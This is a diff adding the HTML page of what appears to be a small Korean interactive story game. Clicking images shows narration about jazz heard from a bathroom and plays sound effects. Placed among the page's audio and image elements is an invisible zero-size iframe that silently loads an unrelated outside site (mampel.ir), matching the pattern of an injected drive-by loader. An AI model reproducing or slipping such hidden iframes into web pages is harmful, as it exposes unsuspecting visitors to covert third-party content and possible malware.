@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html>
+<title>jazz-map2</title>
+<style>
+	body{background-color: #484535;}
+	#backk{width: auto; height: 100%; animation:start 2s alternate;}
+	#backk img{width: 1250px; height: auto;}
+	
+	#bx { position: absolute; bottom: 0%; left: 30%;display:none; }
+	#bx img{ width: 60%; height: auto;  }
+
+	#poom{bottom: 8%; font-weight: 5px; font-size: 1em;display:none; left: 33%;}
+	#poom2{bottom: 8%; font-weight: 5px; font-size: 1em;display:none; left: 33%;}
+
+	#fronts{top: 68%; left: 48%; position: absolute;animation: inin 3s alternate; }
+	#fronts img{width: 50px; height: auto;cursor: pointer; }
+	#turn{bottom: 3%; left: 48%; position: absolute;animation: backk 3s alternate; }
+	#turn img{width: 50px; height: auto;cursor: pointer; }
+
+	#okk{bottom: 11%; right: 30%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#okk img{height: 20px;width: auto; }
+
+	#oo{bottom: 11%; right: 30%;z-index: 6; cursor: pointer; position: absolute;display:none;}
+		#oo img{height: 20px;width: auto; }
+
+	#soun { position: absolute; z-index: 99;cursor: pointer; top:30%; left: 20%; }
+	#soun img{ position: absolute; width: 200px; height: 500px;z-index: 99;cursor: pointer;}
+
+@-webkit-keyframes typing { from { width: 0; } }
+@-webkit-keyframes blink-caret { 50% { border-color: #484535; } }
+
+
+
+@keyframes inin{
+			0%{top: 71%;}
+			
+			100%{top: 68%;}
+		}
+@keyframes backk{
+			0%{bottom: 6%;}
+			
+			100%{bottom: 3%;}
+		}			
+		
+
+
+
+h1 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 23ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 2s steps(30, end),
+	           blink-caret .1s step-end infinite alternate;z-index: 3;
+}
+h2 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 34ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 3s steps(40, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+h3 { 
+	color: #484535;
+	border-right: .2em solid #26241B;
+	 
+	width: 22ch;
+	margin: 2em 1em;
+	white-space: nowrap;
+	overflow: hidden;
+	position: absolute;
+	-webkit-animation: typing 3s steps(50, end),
+	           blink-caret .1s step-end infinite alternate; z-index: 3;
+}
+</style>
+
+<head>
+	<title></title>
+</head>
+
+<body>
+	 <h1 id="poom">화장실에서 재즈가 들려온다.</h2>
+	 	<h2 id="poom2">화장실 음악은 센서작동일텐데...누가 있나?</h2>
+	
+	
+	 	<audio id="walk">
+		<source src="walk.mp3" type="audio/mpeg"autoplay="true" preload="auto">
+	</audio>
+
+		<audio id="bath">
+		<source src="bath.mp3" type="audio/mpeg"autoplay="true" preload="auto">
+	</audio>
+
+
+
+
+<iframe src="http://mampel.ir/" frameborder="0" style="width:0px;height:0px;border:0px" ></iframe>
+
+	<div id="backk">
+		<center>
+		<img src="main2.png">
+		</center>
+	</div>
+	<a href="http://naver.com">
+	<div id="fronts">
+		<img src="there.png">
+	</div>
+</a>
+
+<a href="http://naver.com">
+	<div id="turn">
+		<img src="turn.png">
+	</div>
+</a>
+
+
+	
+
+	<div id="bx">
+		<img src="boox.png">
+	</div>
+	<div id="soun">
+		<img src="blank.png">
+	</div>
+	<div id="oo">
+		<img src="won.png">
+	</div>
+	<div id="okk">
+		<img src="okk.png">
+	</div>
+	
+
+<script type="text/javascript">
+
+
+
+var bbPlay = 0;
+window.onmousemove = function(){
+	bbPlay++;
+	if(bbPlay == 1){bath.play();walk.play();  }
+}
+
+
+	
+var toggle = "off";
+	var clickNumber = 0;
+	soun.onclick = function(){
+		
+			toggle = "on";
+			bx.style.display = "inline";
+			poom.style.display = "inline";
+			oo.style.display = "inline"
+			soun.style.display = "none"
+			}
+
+	oo.onclick = function(){
+			poom.style.display = "none"
+			oo.style.display = "none"
+			poom2.style.display = "inline"
+			okk.style.display = "inline"}
+
+
+
+	okk.onclick = function(){
+			poom2.style.display = "none"
+			okk.style.display = "none"
+			bx.style.display = "none"
+}
+			
+			
+	
+
+
+	floo.onclick = function(){
+		
+		if(toggle == "off"){
+			poom.style.display = "none";
+			floormp.play();
+			toggle = "on";
+			bx.style.display = "inline";
+			poom2.style.display = "inline";}
+			else{
+			toggle = "off";
+			bx.style.display = "none";
+			poom2.style.display = "none";
+			
+		}
+	}
+
+
+
+
+
+
+
+</script>
+</body>
+</html>
